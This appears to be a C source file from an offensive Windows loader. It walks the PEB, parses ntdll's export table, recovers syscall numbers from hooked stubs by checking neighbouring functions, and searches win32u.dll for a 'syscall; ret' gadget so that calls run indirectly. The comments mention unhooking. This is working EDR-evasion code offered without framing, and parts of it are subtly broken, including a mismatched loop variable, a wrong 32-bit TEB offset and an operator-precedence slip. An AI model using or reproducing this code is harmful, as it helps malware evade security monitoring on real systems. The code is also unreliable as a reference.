#include <Windows.h>
#include "Common.h"
#include "Debug.h"

// global variable
NTDLL_CONFIG g_NtdllConf = { 0 };

PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL InitNtdllConfigStructure() {

	// getting peb
	PPEB pPeb = (PPEB)__readgsqword(0x60);
	if (!pPeb || pPeb->OSMajorVersion != 0xA)
		return FALSE;

	// getting ntdll.dll module (skipping our local image element)
	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// getting ntdll's base address
	ULONG_PTR uModule = (ULONG_PTR)(pLdr->DllBase);
	if (!uModule)
		return FALSE;

	// fetching the dos header of ntdll
	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)uModule;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	// fetching the nt headers of ntdll
	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	// fetching the export directory of ntdll
	PIMAGE_EXPORT_DIRECTORY pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	if (!pImgExpDir)
		return FALSE;

	// initalizing the 'g_NtdllConf' structure's element
	g_NtdllConf.uModule = uModule;
	g_NtdllConf.dwNumberOfNames = pImgExpDir->NumberOfNames;
	g_NtdllConf.pdwArrayOfNames = (PDWORD)(uModule + pImgExpDir->AddressOfNames);
	g_NtdllConf.pdwArrayOfAddresses = (PDWORD)(uModule + pImgExpDir->AddressOfFunctions);
	g_NtdllConf.pwArrayOfOrdinals = (PWORD)(uModule + pImgExpDir->AddressOfNameOrdinals);

	// checking
	if (!g_NtdllConf.uModule || !g_NtdllConf.dwNumberOfNames || !g_NtdllConf.pdwArrayOfNames || !g_NtdllConf.pdwArrayOfAddresses || !g_NtdllConf.pwArrayOfOrdinals)
		return FALSE;
	else
		return TRUE;
}

/*
	search for 'syscall; ret;' outside of 'ntdll.dll' [inside of win32u.dll]
*/
BOOL SearchForRop(OUT PVOID* ppRopAddress) {

	PPEB					pPeb = (PEB*)(__readgsqword(0x60));
	PPEB_LDR_DATA			pLdr = (PPEB_LDR_DATA)(pPeb->LoaderData);
	PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);
	// 'i' is used to skip over the local image and ntdll image
	unsigned int			e = 0;

	while (pDte) {

		if (pDte->FullDllName.Length != NULL) {
			// define 'SEARCH_ALL_DLLS' to search all the loaded modules - not recommended tho
			// cuz if an ROP is found outside of win32udll, it will be an RW .text section (will be done later when unhooking), 
			// and thus the process will crash
#ifdef SEARCH_ALL_DLLS
			if (i >= 2) {
#else		
			// search only in 'win32udll' because its the only module to be RX when unhooking
			if (HASH(pDte->FullDllName.Buffer) == win32udll_CRC32 || HASH(pDte->FullDllName.Buffer) == WIN32UDLL_CRC32) {
#endif // SEARCH_ALL

#ifdef DEBUG
				PRINTW(L">>> Searching in \"%s\" ... \n", pDte->FullDllName.Buffer)
#endif // DEBUG
					ULONG_PTR uModule = (ULONG_PTR)pDte->InInitializationOrderLinks.Flink;
				PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)uModule;
				if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
					return FALSE;
				PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(uModule + pDosHdr->e_lfanew);
				if (pNtHdrs->Signature != IMAGE_NT_SIGNATURE)
					return FALSE;

				// search only in the text section, where we have RX permissions
				PVOID	pTxtSection = (PVOID)(uModule + pNtHdrs->OptionalHeader.BaseOfCode);
				SIZE_T	sTextSize = (SIZE_T)pNtHdrs->OptionalHeader.SizeOfCode;

				// searching for
				// <syscall>
				// <ret>	
				// instructions
				for (size_t j = 0; j < sTextSize; j++) {
					if (*((PBYTE)pTxtSection + j) == 0x0F && *((PBYTE)pTxtSection + j + 1) == 0x05 && *((PBYTE)pTxtSection + j + 2) == 0xC3) {
#ifdef DEBUG
						PRINTA("\t[+] Found \"syscall; ret\" gadget At - 0x%p \n", ((PBYTE)pTxtSection + j))
#endif // DEBUG
							* ppRopAddress = (PVOID)((PBYTE)pTxtSection + j);
						return TRUE;
					}
				}
			}

			}
		else {
			break;
		}
		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
		e++;
		}

	if (*ppRopAddress == NULL)
		return FALSE;
	else
		return TRUE;
	}


BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {

	// initialize ntdll config if not found
	if (!g_NtdllConf.uModule) {
		if (!InitNtdllConfigStructure())
			return FALSE;
	}

	if (dwSysHash != NULL)
		pNtSys->dwSyscallHash = dwSysHash;
	else
		return FALSE;

	for (size_t i = 0; i < g_NtdllConf.dwNumberOfNames; i++) {

		PCHAR pcFuncName = (PCHAR)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfNames[i]);
		PVOID pFuncAddress = (PVOID)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfAddresses[g_NtdllConf.pwArrayOfOrdinals[i]]);

		// if syscall found
		if (HASH(pcFuncName) == dwSysHash) {

			pNtSys->pSyscallAddress = pFuncAddress;

			if (*((PBYTE)pFuncAddress) == 0x4C
				&& *((PBYTE)pFuncAddress + 1) == 0x8B
				&& *((PBYTE)pFuncAddress + 2) == 0xD1
				&& *((PBYTE)pFuncAddress + 3) == 0xB8
				&& *((PBYTE)pFuncAddress + 6) == 0x00
				&& *((PBYTE)pFuncAddress + 7) == 0x00) {

				BYTE high = *((PBYTE)pFuncAddress + 5);
				BYTE low = *((PBYTE)pFuncAddress + 4);
				pNtSys->dwSSn = (high << 8) | low;
				break; // break for-loop [i]
			}

			// if hooked - scenario 1
			if (*((PBYTE)pFuncAddress) == 0xE9) {

				for (WORD idx = 1; idx <= RANGE; idx++) {
					// check neighboring syscall down
					if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
						&& *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
						&& *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
						&& *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
						&& *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
						&& *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

						BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
						BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
						pNtSys->dwSSn = (high << 8) | low - idx;
						break; // break for-loop [idx]
					}
					// check neighboring syscall up
					if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
						&& *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
						&& *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
						&& *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
						&& *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
						&& *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

						BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
						BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
						pNtSys->dwSSn = (high << 8) | low + idx;
						break; // break for-loop [idx]
					}
				}
			}

			// if hooked - scenario 2
			if (*((PBYTE)pFuncAddress + 3) == 0xE9) {

				for (WORD idx = 1; idx <= RANGE; idx++) {
					// check neighboring syscall down
					if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
						&& *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
						&& *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
						&& *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
						&& *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
						&& *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

						BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
						BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
						pNtSys->dwSSn = (high << 8) | low - idx;
						break; // break for-loop [idx]
					}
					// check neighboring syscall up
					if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
						&& *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
						&& *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
						&& *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
						&& *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
						&& *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

						BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
						BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
						pNtSys->dwSSn = (high << 8) | low + idx;
						break; // break for-loop [idx]
					}
				}
			}

			break; // break for-loop [i]
		}

	}

	if (!pNtSys->pSyscallAddress)
		return FALSE;

	// looking somewhere random (0xFF byte away from the syscall address)
	ULONG_PTR uFuncAddress = (ULONG_PTR)pNtSys->pSyscallAddress + 0xFF;

	// getting the 'syscall' instruction of another syscall function
	for (DWORD z = 0, x = 1; z <= RANGE; z++, x++) {
		if (*((PBYTE)uFuncAddress + z) == 0x0F && *((PBYTE)uFuncAddress + x) == 0x05) {
			pNtSys->pSyscallInstAddress = ((ULONG_PTR)uFuncAddress + z);
			break; // break for-loop [x & z]
		}
	}

	if (pNtSys->dwSSn != NULL && pNtSys->pSyscallAddress != NULL && pNtSys->dwSyscallHash != NULL && pNtSys->pSyscallInstAddress != NULL)
		return SearchForRop(&pNtSys->pSyscallInstAddress);
	else
		return FALSE;

}